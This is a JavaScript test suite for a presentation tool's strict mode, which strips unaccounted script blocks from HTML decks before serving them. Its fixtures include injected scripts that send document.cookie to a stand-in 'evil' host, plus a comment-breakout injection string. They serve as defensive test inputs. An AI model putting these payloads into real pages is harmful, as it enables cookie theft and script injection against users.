// Copyright 2026 Gilles Philippart
// SPDX-License-Identifier: Apache-2.0

// Strict mode (MARKETPLACE.md PRESENT#STRICT). The design rejects two failure
// modes and both are testable: it must never refuse to serve, and it must never
// serve the unaccounted block. Everything else here defends the third promise —
// that a deck still presents faithfully once the stripping is done — because a
// strict mode that quietly breaks decks is one nobody leaves on.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { mkdtempSync, writeFileSync, rmSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { stripUnaccounted, classifyScripts } from '../cli/audit.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const CLI = path.resolve(here, '../cli/decklight.mjs');
const SRC = path.resolve(here, '../cli/present.mjs');

/** A deck with one of everything the label accounts for. */
const CLEAN = `<!doctype html>
<html><head>
  <style data-decklight-runtime="css">.decklight { color: red }</style>
  <style data-theme="aurora">section { color: blue }</style>
</head><body>
  <div class="decklight">
    <section data-layout="split"><h2>Alpha</h2></section>
    <section data-chart='{"type":"bar","data":[1,2]}'><h2>Beta</h2></section>
  </div>
  <script data-decklight-runtime="js">var Decklight = { init(){} }</script>
  <script type="application/json" id="cast-one">{"v":2}</script>
  <script type="text/template">## notes</script>
  <script>Decklight.init({ theme: "aurora" })</script>
</body></html>
`;

// ── the transform, on its own ──────────────────────────────────────────────

test('a clean deck comes through byte-identical', () => {
  const { html, stripped } = stripUnaccounted(CLEAN);
  assert.equal(stripped.length, 0);
  assert.equal(html, CLEAN, 'nothing to strip means nothing touched — not even whitespace');
});

test('everything a deck needs to render itself survives', () => {
  const poisoned = CLEAN.replace('</body>', '  <script>fetch("//evil/" + document.cookie)</script>\n</body>');
  const { html } = stripUnaccounted(poisoned);

  assert.deepEqual(classifyScripts(html).map((b) => b.kind),
    ['runtime', 'data', 'template', 'boot'], 'the runtime, its data, and the boot call');
  // the parts that were never script in the first place
  assert.match(html, /<style data-theme="aurora">/);
  assert.match(html, /data-layout="split"/);
  assert.match(html, /data-chart='\{"type":"bar"/);
  assert.match(html, /<h2>Beta<\/h2>/);
});

test('the appended block is gone and nothing around it moved', () => {
  const payload = '<script>fetch("//evil")</script>';
  const poisoned = CLEAN.replace('</body>', `  ${payload}\n</body>`);
  const { html, stripped } = stripUnaccounted(poisoned);

  assert.equal(stripped.length, 1);
  assert.doesNotMatch(html, /evil/, 'the payload is not in the served bytes at all');
  // everything except the replaced span is the original, character for character
  assert.equal(html.replace(/<!-- decklight strict mode:[^>]*-->/, payload), poisoned);
});

test('a third-party src= is stripped too — the engine by reference is not', () => {
  const html = `<script src="../dist/decklight.js"></script>
<script src="https://cdn.example/analytics.js"></script>
<script>Decklight.init()</script>`;
  const out = stripUnaccounted(html);
  assert.equal(out.stripped.length, 1);
  assert.match(out.html, /dist\/decklight\.js/, 'a source deck still loads its own runtime');
  assert.doesNotMatch(out.html, /analytics\.js/);
});

test('the replacement carries none of the removed bytes', () => {
  // The obvious bug in a stripper is to name what it removed in the page it
  // serves — which hands the payload a second way in through the comment it
  // was supposed to be neutralised by.
  const nasty = `<script>/* --> */ alert("<script>pwn</` + `script>")</script>`;
  const { html } = stripUnaccounted(CLEAN.replace('</body>', nasty + '</body>'));
  assert.doesNotMatch(html, /alert|pwn/);
  assert.equal((html.match(/-->/g) ?? []).length, 1, 'exactly the one comment it wrote');
});

test('several blocks at once — later offsets survive the earlier splices', () => {
  const poisoned = CLEAN
    .replace('<div class="decklight">', '<script>one()</script>\n  <div class="decklight">')
    .replace('</body>', '  <script>two()</script>\n  <script>three()</script>\n</body>');
  const { html, stripped } = stripUnaccounted(poisoned);
  assert.equal(stripped.length, 3);
  assert.doesNotMatch(html, /one\(\)|two\(\)|three\(\)/);
  assert.match(html, /<h2>Alpha<\/h2>/, 'and the markup between them is intact');
});

// ── the server ─────────────────────────────────────────────────────────────

function deckDir(html = CLEAN, name = 'talk.html') {
  const dir = mkdtempSync(path.join(tmpdir(), 'decklight-strict-'));
  writeFileSync(path.join(dir, name), html);
  return dir;
}

/** Start the server on an ephemeral port; resolve its base URL and its log. */
async function startPresent(t, dir, { deck = 'talk.html', extraArgs = [] } = {}) {
  const child = spawn(process.execPath, [CLI, 'present', deck, '--port', '0', ...extraArgs],
    { cwd: dir, stdio: ['ignore', 'pipe', 'pipe'] });
  t.after(() => { child.kill('SIGKILL'); rmSync(dir, { recursive: true, force: true }); });
  let out = '';
  child.stdout.on('data', (c) => { out += c; });
  child.stderr.on('data', (c) => { out += c; });
  const base = await new Promise((resolve, reject) => {
    const scan = setInterval(() => {
      const m = out.match(/http:\/\/127\.0\.0\.1:(\d+)/);
      if (m) { clearInterval(scan); resolve(`http://127.0.0.1:${m[1]}`); }
    }, 25);
    child.on('exit', () => { clearInterval(scan); reject(new Error('present exited early:\n' + out)); });
    setTimeout(() => { clearInterval(scan); reject(new Error('timeout waiting for present:\n' + out)); }, 10000);
  });
  return { base, log: () => out };
}

const POISONED = CLEAN.replace('</body>',
  '  <script>window.__pwned = 1; fetch("//evil/" + document.cookie)</script>\n</body>');

test('an unaccounted block turns strict on by itself, and the deck still plays', async (t) => {
  const dir = deckDir(POISONED);
  const { base, log } = await startPresent(t, dir);

  const res = await fetch(base + '/');
  assert.equal(res.status, 200, 'it never refuses to serve — that is the whole design');
  const body = await res.text();
  assert.doesNotMatch(body, /__pwned|evil/, 'and it never serves the block it could not account for');
  assert.match(body, /<h2>Alpha<\/h2>/, 'the deck itself is untouched');
  assert.match(body, /Decklight\.init/, 'including the call that boots it');

  assert.match(log(), /1 unaccounted script block stripped — serving strict/,
    'the terminal says what happened, without being asked');
});

test('what was stripped is said in the terminal, never on the page', async (t) => {
  const dir = deckDir(POISONED);
  const { base } = await startPresent(t, dir);
  const body = await res_text(base + '/');

  // The audience is looking at this. Whatever the tool has to say about the
  // file belongs in the presenter's terminal — so nothing outside an HTML
  // comment may mention it.
  const visible = body.replace(/<!--[\s\S]*?-->/g, '');
  assert.doesNotMatch(visible, /strict|stripped|unaccounted/i);
});

test('--strict on a clean deck serves exactly the bytes on disk', async (t) => {
  const dir = deckDir();
  const { base } = await startPresent(t, dir, { extraArgs: ['--strict'] });

  assert.equal(await res_text(base + '/'), CLEAN,
    'byte-identical to the file — so a clean deck renders identically with the flag or without it');
});

test('the file on disk is never modified, only the response', async (t) => {
  const dir = deckDir(POISONED);
  const { base } = await startPresent(t, dir);

  await fetch(base + '/');
  await fetch(base + '/talk.html');
  assert.equal(readFileSync(path.join(dir, 'talk.html'), 'utf8'), POISONED,
    'the deck you were sent is still the deck you were sent');
});

test('strict covers every html response, not just the deck', async (t) => {
  // A second page under the served root is reachable from the deck (the theme
  // picker and speaker view both boot documents into same-origin iframes), so
  // stripping only the named file would be a mode with a door next to it.
  const dir = deckDir(POISONED);
  writeFileSync(path.join(dir, 'other.html'), '<html><body><script>window.__also = 1</script></body></html>');
  const { base } = await startPresent(t, dir);

  assert.doesNotMatch(await res_text(base + '/other.html'), /__also/);
});

test('there is no way to turn it back off', async () => {
  // Not an omission — PRESENT#STRICT rejects the escape hatch outright, because
  // the moment it would be reached for is the moment it should not exist. So no
  // argument is READ that could re-enable the block; the usage text is allowed
  // to name --force precisely because it is explaining that there isn't one.
  const src = readFileSync(SRC, 'utf8');
  assert.doesNotMatch(src, /(?:includes|opt)\(\s*['"]--(?:force|no-strict|unsafe|allow)/,
    'no flag re-enables the block the label could not account for');
  assert.match(src, /no --force/, 'and the usage text says so, rather than staying quiet about it');
});

test('--help documents the automatic degrade, not just the flag', async () => {
  const { execFileSync } = await import('node:child_process');
  const out = execFileSync(process.execPath, [CLI, 'present', '--help'], { encoding: 'utf8' });
  assert.match(out, /--strict/);
  assert.match(out, /turns itself on|turns ITSELF on/i, 'the behaviour someone will meet without asking for it');
});

/** GET a URL and return its body — the assertion above reads better this way. */
async function res_text(url) {
  const res = await fetch(url);
  assert.equal(res.status, 200, `GET ${url}`);
  return res.text();
}
